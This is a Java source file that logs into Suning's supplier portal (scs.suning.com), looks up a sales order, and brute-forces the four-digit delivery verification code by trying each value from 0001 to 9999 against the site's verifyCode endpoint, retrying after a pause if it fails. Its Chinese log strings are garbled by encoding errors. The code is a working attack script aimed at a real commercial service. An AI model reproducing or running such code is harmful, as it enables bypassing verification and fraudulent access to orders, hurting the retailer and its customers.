package wilson.verifyCode;

import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.Date;
import java.util.List;

import org.apache.http.cookie.Cookie;
import org.apache.http.impl.client.BasicCookieStore;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

public class HttpClientTest {
	private static List<Cookie> loginCookies;
	private static BasicCookieStore cookieStore = new BasicCookieStore();
	private static CloseableHttpClient httpclient = HttpClients.custom()
    .setDefaultCookieStore(cookieStore)
    .build();
	private static VerifyCode vc = new VerifyCode();
	private static SelectDeliverInform sdi = new SelectDeliverInform();
	private static Login lg = new Login();
	private int codeInt = 1;



    public String startThis(String userName,String password,String saleOrderNo) throws Exception {
    	
    	System.out.println("�����У��û��� = " + userName + "  ���۵��� = " + saleOrderNo );
    	
    	if(!login(userName, password)){
    		System.out.println("�û��� = " + userName + "  ���۵��� = " + saleOrderNo  + "   ʧ�� ����֤����Ե�" + this.getCodeInt());
    		return "��¼ʧ��";
    	} 
    	
    	if(!select(saleOrderNo)){
    		System.out.println("�û��� = " + userName + "  ���۵��� = " + saleOrderNo  + "   ʧ�� ����֤����Ե�" + this.getCodeInt());
    		return "��ѯʧ��";
    	} 
    	
    	if(!tryCode(sdi.getHidreturnnoticedetailid())){
    		System.out.println("�û��� = " + userName + "  ���۵��� = " + saleOrderNo  + "   ʧ�� ����֤����Ե�" + this.getCodeInt());
    		Thread.currentThread();
			Thread.sleep(10000);
    		System.out.println("�û��� = " + userName + "  ���۵��� = " + saleOrderNo  + "   ������");
    		if(login(userName, password) && select(saleOrderNo) && tryCode(sdi.getHidreturnnoticedetailid())){
    			//continue;
    		}else{
    			return "�ƽ�ʧ��";
    		}
    	} 
    	
    	//�ر�client
    	closeClient();
    	
    	System.out.println("�û��� = " + userName + "  ���۵��� = " + saleOrderNo  + "   �ɹ�  ����֤����  " + this.getCodeInt());
    	//�ɹ�������¼
    	saveData(saleOrderNo,this.getCodeInt());
    	return "�ɹ�";
    }
    
    
    //�ɹ�������¼
    private boolean saveData(String saleOrderNo,int CodeInt){
    	return true;
    }
    
    private boolean closeClient(){
    	try {
			HttpClientTest.getHttpclient().close();	
			return true;
		} catch (IOException e) {
			e.printStackTrace();
		}
    	return false;
    }
    
    private boolean tryCode(String hidReturnNoticeDetailId) {
    	//������֤
    	try{
    		System.out.println("��ʼ��֤ʱ�� =" + new Date());
        	int verifycodeResult = verifycode(1,hidReturnNoticeDetailId);

    		if(verifycodeResult == 0){
        		System.out.println("��֤��ɣ�verifycodeResult = " + verifycodeResult);
        	}else if(verifycodeResult == 1){
        		System.out.println("��ֹ֤ͣ��verifycodeResult = " + verifycodeResult);
        		return false;
        	}else{
        		System.out.println("��ֹ֤ͣ��verifycodeResult = " + verifycodeResult);
        		return false;
        	}
        	
        	System.out.println("�����֤ʱ�� = " + new Date());
        	return true;
    	}catch(Exception e){
    		e.printStackTrace();
    	}
    	return false;
    }
    
    public boolean login(String userName,String password) throws URISyntaxException{
    	//��¼
    	if(true == lg.login(new URI("http://scs.suning.com/sps/portal/showLoginPage.action"),userName,password)){
    		System.out.println("��¼�ɹ�");   		
//    		if (null != loginCookies) {
//    			System.out.println("��¼cookies");
//                for (int i = 0; i < loginCookies.size(); i++) {
//                    System.out.println("- " + loginCookies.get(i).toString());
//                }
//            }
    		return true;
    	}else{
    		System.out.println("��¼ʧ��");
    		return false;
    	}
    }
    
    public boolean select(String saleOrderNo) throws URISyntaxException{
    	//��ѯ
    	if(true == sdi.selectDeliverInform(new URI("http://scs.suning.com/te/deliveryinformdetailcontroller/selectDeliveryInform.action"),saleOrderNo)){
    		System.out.println("��ѯ�ɹ�");
    		return true;
    	}else{
    		System.out.println("��ѯʧ��");
    		return false;
    	}
    	
    }
    
    //������֤��
    private int verifycode(int startCode,String hidReturnNoticeDetailId) throws URISyntaxException {
    	int resultcode = -1;
    	int i = 0;
    	codeInt = startCode;
    	String codeStr = String.valueOf(codeInt);
    	while(codeStr.length() < 4){
    		codeStr = "0" + codeStr;
    	}
    	while(codeInt < 10000){
    		resultcode = vc.VerifyCode(new URI("http://scs.suning.com/te/deliveryinformdetailcontroller/verifyCode.action"), codeStr ,hidReturnNoticeDetailId);
    		if(resultcode == 1){   	
    			codeInt ++;
    			if(0 == (i % 100)){
    				System.out.println("code : " + codeInt + " " + resultcode + "  ");
    			}
    			i ++ ;
        		codeStr = String.valueOf(codeInt);
            	while(codeStr.length() < 4){
            		codeStr = "0" + codeStr;
            	}
    		}else{
            	System.out.println("other result, result = " + resultcode);
    			break;
    		}
    	}
		return resultcode;
    }

	public static List<Cookie> getLoginCookies() {
		return loginCookies;
	}

	public static void setLoginCookies(List<Cookie> loginCookies) {
		HttpClientTest.loginCookies = loginCookies;
	}

	public static CloseableHttpClient getHttpclient() {
		return httpclient;
	}

	public static void setHttpclient(CloseableHttpClient httpclient) {
		HttpClientTest.httpclient = httpclient;
	}

	public static BasicCookieStore getCookieStore() {
		return cookieStore;
	}

	public static void setCookieStore(BasicCookieStore cookieStore) {
		HttpClientTest.cookieStore = cookieStore;
	}

	public static VerifyCode getVc() {
		return vc;
	}

	public static void setVc(VerifyCode vc) {
		HttpClientTest.vc = vc;
	}

	public static SelectDeliverInform getSdi() {
		return sdi;
	}

	public static void setSdi(SelectDeliverInform sdi) {
		HttpClientTest.sdi = sdi;
	}

	public static Login getLg() {
		return lg;
	}

	public static void setLg(Login lg) {
		HttpClientTest.lg = lg;
	}

	public int getCodeInt() {
		return codeInt;
	}

	public void setCodeInt(int codeInt) {
		this.codeInt = codeInt;
	}
}
